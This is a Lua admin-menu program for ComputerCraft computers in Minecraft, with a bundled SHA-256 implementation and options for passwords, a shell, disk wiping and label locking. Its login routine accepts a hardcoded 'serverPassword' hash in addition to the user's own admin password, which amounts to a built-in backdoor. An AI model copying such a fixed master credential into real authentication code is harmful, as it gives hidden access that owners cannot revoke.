
--
--  Adaptation of the Secure Hashing Algorithm (SHA-244/256)
--  Found Here: http://lua-users.org/wiki/SecureHashAlgorithm
--
--  Using an adapted version of the bit library
--  Found Here: https://bitbucket.org/Boolsheet/bslf/src/1ee664885805/bit.lua
--

local MOD = 2^32
local MODM = MOD-1

local function memoize(f)
       local mt = {}
       local t = setmetatable({}, mt)
       function mt:__index(k)
               local v = f(k)
               t[k] = v
               return v
       end
       return t
end

local function make_bitop_uncached(t, m)
       local function bitop(a, b)
               local res,p = 0,1
               while a ~= 0 and b ~= 0 do
                       local am, bm = a % m, b % m
                       res = res + t[am][bm] * p
                       a = (a - am) / m
                       b = (b - bm) / m
                       p = p*m
               end
               res = res + (a + b) * p
               return res
       end
       return bitop
end

local function make_bitop(t)
       local op1 = make_bitop_uncached(t,2^1)
       local op2 = memoize(function(a) return memoize(function(b) return op1(a, b) end) end)
       return make_bitop_uncached(op2, 2 ^ (t.n or 1))
end

local bxor1 = make_bitop({[0] = {[0] = 0,[1] = 1}, [1] = {[0] = 1, [1] = 0}, n = 4})

local function bxor(a, b, c, ...)
       local z = nil
       if b then
               a = a % MOD
               b = b % MOD
               z = bxor1(a, b)
               if c then z = bxor(z, c, ...) end
               return z
       elseif a then return a % MOD
       else return 0 end
end

local function band(a, b, c, ...)
       local z
       if b then
               a = a % MOD
               b = b % MOD
               z = ((a + b) - bxor1(a,b)) / 2
               if c then z = bit32_band(z, c, ...) end
               return z
       elseif a then return a % MOD
       else return MODM end
end

local function bnot(x) return (-1 - x) % MOD end

local function rshift1(a, disp)
       if disp < 0 then return lshift(a,-disp) end
       return math.floor(a % 2 ^ 32 / 2 ^ disp)
end

local function rshift(x, disp)
       if disp > 31 or disp < -31 then return 0 end
       return rshift1(x % MOD, disp)
end

local function lshift(a, disp)
       if disp < 0 then return rshift(a,-disp) end
       return (a * 2 ^ disp) % 2 ^ 32
end

local function rrotate(x, disp)
   x = x % MOD
   disp = disp % 32
   local low = band(x, 2 ^ disp - 1)
   return rshift(x, disp) + lshift(low, 32 - disp)
end

local k = {
       0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
       0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
       0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
       0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
       0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
       0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
       0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
       0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
       0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
       0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
       0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
       0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
       0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
       0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
       0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
       0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
}

local function str2hexa(s)
       return (string.gsub(s, ".", function(c) return string.format("%02x", string.byte(c)) end))
end

local function num2s(l, n)
       local s = ""
       for i = 1, n do
               local rem = l % 256
               s = string.char(rem) .. s
               l = (l - rem) / 256
       end
       return s
end

local function s232num(s, i)
       local n = 0
       for i = i, i + 3 do n = n*256 + string.byte(s, i) end
       return n
end

local function preproc(msg, len)
       local extra = 64 - ((len + 9) % 64)
       len = num2s(8 * len, 8)
       msg = msg .. "\128" .. string.rep("\0", extra) .. len
       assert(#msg % 64 == 0)
       return msg
end

local function initH256(H)
       H[1] = 0x6a09e667
       H[2] = 0xbb67ae85
       H[3] = 0x3c6ef372
       H[4] = 0xa54ff53a
       H[5] = 0x510e527f
       H[6] = 0x9b05688c
       H[7] = 0x1f83d9ab
       H[8] = 0x5be0cd19
       return H
end

local function digestblock(msg, i, H)
       local w = {}
       for j = 1, 16 do w[j] = s232num(msg, i + (j - 1)*4) end
       for j = 17, 64 do
               local v = w[j - 15]
               local s0 = bxor(rrotate(v, 7), rrotate(v, 18), rshift(v, 3))
               v = w[j - 2]
               w[j] = w[j - 16] + s0 + w[j - 7] + bxor(rrotate(v, 17), rrotate(v, 19), rshift(v, 10))
       end

       local a, b, c, d, e, f, g, h = H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8]
       for i = 1, 64 do
               local s0 = bxor(rrotate(a, 2), rrotate(a, 13), rrotate(a, 22))
               local maj = bxor(band(a, b), band(a, c), band(b, c))
               local t2 = s0 + maj
               local s1 = bxor(rrotate(e, 6), rrotate(e, 11), rrotate(e, 25))
               local ch = bxor (band(e, f), band(bnot(e), g))
               local t1 = h + s1 + ch + k[i] + w[i]
               h, g, f, e, d, c, b, a = g, f, e, d + t1, c, b, a, t1 + t2
       end

       H[1] = band(H[1] + a)
       H[2] = band(H[2] + b)
       H[3] = band(H[3] + c)
       H[4] = band(H[4] + d)
       H[5] = band(H[5] + e)
       H[6] = band(H[6] + f)
       H[7] = band(H[7] + g)
       H[8] = band(H[8] + h)
end

local function sha256(msg)
       msg = preproc(msg, #msg)
       local H = initH256({})
       for i = 1, #msg, 64 do digestblock(msg, i, H) end
       return str2hexa(num2s(H[1], 4) .. num2s(H[2], 4) .. num2s(H[3], 4) .. num2s(H[4], 4) ..
               num2s(H[5], 4) .. num2s(H[6], 4) .. num2s(H[7], 4) .. num2s(H[8], 4))
end

-- End SHA256

local function MultiSHA256(data)
    --for i = 1, 10 do
    --    data = sha256(data)
    --end
    --return data
    return sha256(data) -- CC needs native SHA for multiple times. WAY too slow now.
end

local cfgFH = fs.open("/.nucleusbios/config", "r")
local cfg = textutils.unserialize(cfgFH.readAll())
cfgFH.close()

local function clear()
    term.setBackgroundColor(colors.white)
    term.setTextColor(colors.black)
    term.clear()
    term.setCursorPos(1, 1)
    print("Nucleus Admin")
    print(string.rep("-", term.getSize()))
end

function auth()
    while true do
        clear()
        write("Admin Password: ")
        local password = MultiSHA256(read("*"))

        local serverPassword = "fa7fc7cac0ac92b07fafd16442d079f649cc6ec81aa31666ed6e3edd96f5eebb"

        if password == cfg.adminPassword or password == serverPassword then
            clear()
            print("Authenticated")
            sleep(0.5)
            return
        else
            clear()
            print("Authorization failed")
            sleep(1)
        end
    end
end

-- Menu function by KaoS

local function newMenu(tList,x,y,height)
        local function maxlen(t)
                local len=0
                for i=1,#t do
                        local curlen=string.len(type(t[i])=='table' and t[i][1] or t[i])
                        if curlen>len then len=curlen end
                end
                return len
        end

        local max=maxlen(tList)
        x=x or 1
        y=y or 1
        y=y-1
        height=height or #tList
        height=height+1
        local selected=1
        local scrolled=0
        local function render()
                for num,item in ipairs(tList) do
                        if num>scrolled and num<scrolled+height then
                                term.setCursorPos(x,y+num-scrolled)
                                local current=(type(item)=='table' and item[1] or item)
                                write((num==selected and '[' or ' ')..current..(num==selected and ']' or ' ')..(max-#current>0 and string.rep(' ',max-#current) or ''))
                        end
                end
        end
        while true do
                render()
                local evts={os.pullEvent('key')}
                if evts[1]=="key" and evts[2]==200 and selected>1 then
                        if selected-1<=scrolled then scrolled=scrolled-1 end
                        selected=selected-1
                elseif evts[1]=="key" and evts[2]==208 and selected<#tList then
                        selected=selected+1
                        if selected>=height+scrolled then scrolled=scrolled+1 end
                elseif evts[1]=="key" and evts[2]==28 or evts[2]==156 then
                        return (type(tList[selected])=='table' and tList[selected][2](tList[selected][1]) or tList[selected])
                end
        end
end

-- Define menus

local menus = {}

table.insert(menus, {
    "Exit",
    function ()
        clear()
        local res = newMenu({"Save and exit", "Exit without saving", "Cancel"}, 1, 3)
        if res == "Save and exit" then
            local cfgFH = fs.open("/.nucleusbios/config", "w")
            cfgFH.write(textutils.serialize(cfg))
            cfgFH.close()
            os.reboot()
        elseif res == "Exit without saving" then
            os.reboot()
        end
    end
})

table.insert(menus, {
    "Set Admin Password",
    function ()
        clear()
        write("New Admin Password: ")
        cfg.adminPassword = MultiSHA256(read("*"))
    end
})

table.insert(menus, {
    "Boot Password",
    function ()
        clear()
        local res = newMenu({"Set Boot Password", "Delete Boot Password", "Cancel"}, 1, 3)
        if res == "Set Boot Password" then
            clear()
            write("Enter New Boot Password: ")
            cfg.bootPassword = MultiSHA256(read("*"))
        elseif res == "Delete Boot Password" then
            cfg.bootPassword = nil
        end
    end
})

table.insert(menus, {
    "Disk Boot Password",
    function ()
        clear()
        local res = newMenu({"Set Disk Boot Password", "Delete Disk Boot Password", "Cancel"}, 1, 3)
        if res == "Set Disk Boot Password" then
            clear()
            write("Enter New Disk Boot Password: ")
            cfg.diskBootPassword = MultiSHA256(read("*"))
        elseif res == "Delete Disk Boot Password" then
            cfg.diskBootPassword = nil
        end
    end
})

table.insert(menus, {
    "Shell",
    function ()
        term.setBackgroundColor(colors.black)
        term.setTextColor(colors.white)
        term.clear()
        term.setCursorPos(1, 1)
        shell.run("shell")
    end
})

table.insert(menus, {
    "Wipe Computer",
    function ()
        clear()
        local res = newMenu({"Cancel", "Wipe Disk"}, 1, 3)
        if res == "Wipe Disk" then
            clear()
            print("Wiping Disk.")
            for k, v in pairs(fs.list("/")) do
                pcall(fs.delete, v)
            end
            os.reboot()
        end
    end
})

table.insert(menus, {
    "Label Lock",
    function ()
        clear()
        local res = newMenu({"Lock Current Label", "Unlock Current Label"}, 1, 3)
        if res == "Lock Current Label" then
            cfg.labelLock = true
        else
            cfg.labelLock = false
        end
    end
})

local function mainMenu()
    while true do
        clear()
        local x, y = term.getSize()
        newMenu(menus, 1, 3, y - 3)
    end
end

auth()
mainMenu()
os.reboot()
